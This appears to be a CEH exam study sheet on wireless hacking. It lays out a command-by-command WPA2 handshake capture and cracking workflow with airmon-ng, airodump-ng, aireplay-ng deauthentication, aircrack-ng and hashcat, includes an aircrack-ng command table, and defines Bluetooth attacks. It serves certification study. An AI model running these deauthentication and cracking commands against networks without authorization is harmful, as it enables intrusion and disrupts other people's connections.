# 02. Attack Techniques — Hacking Wireless Networks

> [!WARNING] ⚡ **Exploitation Methodologies & Execution Scenarios**
> Direct extraction from official CEH v13 Syllabus (Module 16). Covers Monitor Mode Configuration, Aircrack-ng Suite Workflows, WPA2 Handshake Capture & Cracking, Rogue AP deployment, and Bluetooth Hacking techniques.

---

## ⚔️ 1. Primary Wireless Exploitation Workflows

### 1.1 WPA2 4-Way Handshake Capture & Cracking Workflow

#### Step 1: Enable Monitor Mode on Wireless Interface
```bash
# Put wireless interface into monitor mode
airmon-ng start wlan0
```

#### Step 2: Discover Target Networks & Capture Handshake
```bash
# Scan target BSSID and Channel
airodump-ng wlan0mon

# Target specific AP and capture output to file
airodump-ng --bssid 00:11:22:33:44:55 --channel 6 -w wpa2_capture wlan0mon
```

#### Step 3: Deauthenticate Victim Client to Force Handshake
```bash
# Transmit spoofed deauthentication management frames
aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

#### Step 4: Offline Dictionary Password Cracking
```bash
# Crack capture file using Aircrack-ng or Hashcat
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 wpa2_capture-01.cap
hashcat -m 22000 wpa2_capture.hc22000 /usr/share/wordlists/rockyou.txt
```

> [!DANGER] 🛡️ **📋 Comprehensive Aircrack-ng Tool Command Matrix**

| Utility | Primary Function | Example Command Syntax |
| :--- | :--- | :--- |
| **airmon-ng** | Toggles RFMON monitor mode | `airmon-ng start wlan0` |
| **airodump-ng**| Raw 802.11 packet capture | `airodump-ng -c 6 --bssid BSSID -w cap wlan0mon` |
| **aireplay-ng**| Packet injection & Deauth | `aireplay-ng --deauth 5 -a BSSID wlan0mon` |
| **aircrack-ng**| WEP/WPA PSK key cracker | `aircrack-ng -w wordlist.txt file.cap` |

---

## 🛡️ 2. Bluetooth Attack Vectors

- **Bluejacking**: Sending unsolicited messages/vCards to Bluetooth-enabled devices.
- **Bluesnarfing**: Unauthorized access and theft of contacts, emails, and files from a Bluetooth device without user consent.
- **Bluebugging**: Gaining full remote control over a target Bluetooth phone to make calls or send SMS messages.
